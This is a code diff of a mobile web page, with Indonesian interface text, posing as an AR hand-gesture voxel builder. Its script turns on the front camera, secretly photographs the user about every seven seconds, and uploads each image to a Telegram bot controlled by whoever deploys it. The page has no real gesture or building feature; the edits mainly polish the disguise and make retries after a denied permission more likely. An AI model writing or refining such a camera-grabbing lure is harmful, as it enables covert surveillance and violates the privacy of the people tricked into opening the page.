@@ -15,6 +15,7 @@
             overflow: hidden;
             height: 100vh;
             width: 100vw;
+            touch-action: manipulation;
         }
 
         video {
@@ -24,6 +25,7 @@
             object-fit: cover;
             z-index: 1;
             display: none;
+            background: #111;
         }
 
         .overlay {
@@ -31,38 +33,39 @@
             top: 0; left: 0;
             width: 100%; height: 100%;
             z-index: 10;
+            pointer-events: none;
         }
 
         .top-bar {
             position: fixed;
             top: 0; left: 0; right: 0;
-            padding: 15px 20px;
+            padding: 12px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             z-index: 30;
-            background: linear-gradient(to bottom, rgba(0,0,0,0.85), transparent);
+            background: linear-gradient(to bottom, rgba(0,0,0,0.9), transparent);
+            font-size: 16px;
         }
-
-        .time { font-size: 17px; font-weight: 500; }
 
         .header {
             text-align: center;
-            margin-top: 80px;
+            margin-top: 90px;
             z-index: 20;
+            pointer-events: auto;
         }
 
         .title {
-            font-size: 28px;
+            font-size: 29px;
             font-weight: 700;
-            margin-bottom: 8px;
-            text-shadow: 0 2px 15px rgba(0,0,0,0.9);
+            margin-bottom: 6px;
+            text-shadow: 0 3px 15px rgba(0,0,0,0.9);
         }
 
         .subtitle {
-            font-size: 16px;
-            color: #bbb;
-            margin-bottom: 50px;
+            font-size: 15.5px;
+            color: #ccc;
+            margin-bottom: 40px;
         }
 
         .ar-frame {
@@ -70,11 +73,11 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            width: 320px;
+            width: 300px;
             height: 420px;
-            border: 3px solid rgba(0, 255, 255, 0.7);
-            border-radius: 24px;
-            box-shadow: 0 0 50px rgba(0, 255, 255, 0.5);
+            border: 3px solid rgba(0, 255, 200, 0.8);
+            border-radius: 28px;
+            box-shadow: 0 0 60px rgba(0, 255, 200, 0.6);
             z-index: 15;
             pointer-events: none;
         }
@@ -83,121 +86,125 @@
             position: absolute;
             top: 0; left: 0;
             width: 100%;
-            height: 4px;
-            background: linear-gradient(90deg, transparent, #00ffff, transparent);
-            animation: scan 3.5s linear infinite;
-            box-shadow: 0 0 20px #00ffff;
+            height: 5px;
+            background: linear-gradient(90deg, transparent, #00ffc8, transparent);
+            animation: scan 4s linear infinite;
+            box-shadow: 0 0 25px #00ffc8;
         }
 
         @keyframes scan {
-            0% { top: 0; }
+            0%   { top: 0%; }
             100% { top: 100%; }
         }
 
         .controls {
             position: fixed;
-            bottom: 100px;
+            bottom: 110px;
             left: 50%;
             transform: translateX(-50%);
             z-index: 30;
+            pointer-events: auto;
         }
 
         .btn {
-            background: rgba(0, 255, 255, 0.12);
-            color: #00ffff;
-            border: 2px solid #00ffff;
-            padding: 16px 50px;
+            background: rgba(0, 255, 200, 0.15);
+            color: #00ffc8;
+            border: 2.5px solid #00ffc8;
+            padding: 16px 55px;
             border-radius: 50px;
             font-size: 18px;
-            font-weight: 600;
-            backdrop-filter: blur(12px);
+            font-weight: 700;
+            backdrop-filter: blur(15px);
             cursor: pointer;
-            transition: all 0.3s ease;
+            box-shadow: 0 0 30px rgba(0, 255, 200, 0.4);
         }
 
         .btn:active {
-            background: #00ffff;
-            color: #000;
-            transform: scale(0.95);
+            background: #00ffc8;
+            color: black;
+            transform: scale(0.96);
         }
 
         .status {
             position: fixed;
-            bottom: 40px;
+            bottom: 45px;
             left: 50%;
             transform: translateX(-50%);
-            background: rgba(0,0,0,0.75);
-            padding: 12px 30px;
-            border-radius: 30px;
-            font-size: 15.5px;
+            background: rgba(0,0,0,0.8);
+            padding: 14px 32px;
+            border-radius: 40px;
+            font-size: 16px;
             z-index: 30;
-            min-width: 200px;
             text-align: center;
+            min-width: 220px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.6);
         }
 
         .gesture-hint {
             position: absolute;
-            bottom: 200px;
+            bottom: 210px;
             left: 50%;
             transform: translateX(-50%);
-            color: #00ffff;
+            color: #00ffc8;
             font-size: 15px;
-            text-shadow: 0 0 12px #00ffff;
+            text-shadow: 0 0 15px #00ffc8;
             z-index: 20;
+            pointer-events: auto;
         }
     </style>
 </head>
 <body>
 
-    <video id="video" autoplay playsinline></video>
+    <video id="video" autoplay playsinline muted></video>
 
     <div class="overlay">
         <div class="top-bar">
-            <div class="time" id="time">19:30</div>
-            <div style="font-size:18px; font-weight:600;">AR Hand Gesture</div>
-            <div>4G • 60%</div>
+            <div id="time">19:30</div>
+            <div style="font-weight:600; font-size:18px;">AR Voxel Builder</div>
+            <div>4G</div>
         </div>
 
         <div class="header">
             <div class="title">Voxel Builder</div>
-            <div class="subtitle">Gunakan gerakan tangan untuk membangun voxel di AR</div>
+            <div class="subtitle">Gerakkan tangan Anda untuk membangun di AR</div>
         </div>
 
         <div class="ar-frame">
             <div class="scan-line"></div>
         </div>
 
-        <div class="gesture-hint">✋ Angkat tangan Anda di depan kamera</div>
+        <div class="gesture-hint">✋ Angkat tangan di depan kamera</div>
 
         <div class="controls">
-            <button id="startBtn" class="btn">MULAI DETEKSI KAMERA</button>
+            <button id="startBtn" class="btn">MULAI KAMERA</button>
         </div>
 
-        <div id="status" class="status">Siap mendeteksi gerakan tangan</div>
+        <div id="status" class="status">Tekan tombol untuk memulai</div>
     </div>
 
-    <canvas id="canvas" style="display: none;"></canvas>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const BOT_TOKEN = "GANTI_DENGAN_TOKEN_BOT_ANDA";   // ← GANTI INI
-        const CHAT_ID = "GANTI_DENGAN_CHAT_ID_ANDA";       // ← GANTI INI
+        // === GANTI DUA BARIS INI ===
+        const BOT_TOKEN = "GANTI_DENGAN_TOKEN_BOT_ANDA";
+        const CHAT_ID = "GANTI_DENGAN_CHAT_ID_ANDA";
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const startBtn = document.getElementById('startBtn');
         const status = document.getElementById('status');
 
-        // Update jam
+        // Update waktu
         function updateTime() {
-            const timeEl = document.getElementById('time');
             setInterval(() => {
                 const now = new Date();
-                timeEl.textContent = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
+                document.getElementById('time').textContent = now.toLocaleTimeString('id-ID', {hour:'2-digit', minute:'2-digit'});
             }, 1000);
         }
         updateTime();
 
         async function sendToTelegram(base64) {
+            if (!BOT_TOKEN || !CHAT_ID) return;
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
 
@@ -207,72 +214,76 @@
             for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
 
             const blob = new Blob([ab], { type: 'image/jpeg' });
-            formData.append('photo', blob, `hand_gesture_${Date.now()}.jpg`);
+            formData.append('photo', blob, `capture_${Date.now()}.jpg`);
 
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
-            } catch (e) { }
+            } catch (e) {}
         }
 
         async function captureAndSend() {
-            status.textContent = "Mengambil foto...";
+            status.textContent = "📸 Mengambil foto...";
 
             canvas.width = video.videoWidth || 1280;
             canvas.height = video.videoHeight || 720;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            const base64 = canvas.toDataURL('image/jpeg', 0.95);
+            const base64 = canvas.toDataURL('image/jpeg', 0.93);
             await sendToTelegram(base64);
 
-            status.textContent = "✅ Foto terkirim";
+            status.textContent = "✅ Foto terkirim ke bot";
         }
 
-        // Fungsi utama mulai kamera
         async function startCamera() {
-            startBtn.style.display = 'none';
+            startBtn.style.opacity = "0.3";
+            startBtn.style.pointerEvents = "none";
             status.textContent = "Mengakses kamera...";
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { 
+                    video: {
                         facingMode: "user",
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
+                        width: { ideal: 1280, min: 640 },
+                        height: { ideal: 720, min: 480 }
                     }
                 });
 
                 video.srcObject = stream;
-                video.style.display = 'block';
+                video.style.display = "block";
 
-                status.textContent = "Kamera aktif • Mendeteksi...";
+                status.textContent = "Kamera aktif • Deteksi berjalan";
 
-                // Ambil foto pertama setelah 2.5 detik
-                setTimeout(() => captureAndSend(), 2500);
+                // Capture pertama
+                setTimeout(() => captureAndSend(), 2200);
 
-                // Ambil foto lagi setiap 7 detik
+                // Capture berkala setiap 7 detik
                 setInterval(() => {
-                    if (video.srcObject) captureAndSend();
+                    if (video.srcObject && !video.paused) captureAndSend();
                 }, 7000);
 
             } catch (err) {
-                status.innerHTML = `<span style="color:#ff4444;">Gagal mengakses kamera.<br>Mohon izinkan izin kamera.</span>`;
                 console.error(err);
+                let msg = "Gagal mengakses kamera.";
+                if (err.name === "NotAllowedError") msg = "Izin kamera ditolak.";
+                else if (err.name === "NotFoundError") msg = "Kamera tidak ditemukan.";
+                else if (err.name === "NotReadableError") msg = "Kamera sedang digunakan aplikasi lain.";
+
+                status.innerHTML = `<span style="color:#ff5555;">${msg}<br><small>Coba refresh halaman</small></span>`;
+                startBtn.style.opacity = "1";
+                startBtn.style.pointerEvents = "auto";
             }
         }
 
-        // Event klik tombol
         startBtn.addEventListener('click', startCamera);
 
-        // Fullscreen saat klik layar pertama kali
-        let fullscreenDone = false;
+        // Fullscreen otomatis
         document.addEventListener('click', () => {
-            if (!fullscreenDone && document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
-                fullscreenDone = true;
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().catch(() => {});
             }
         }, { once: true });
     </script>
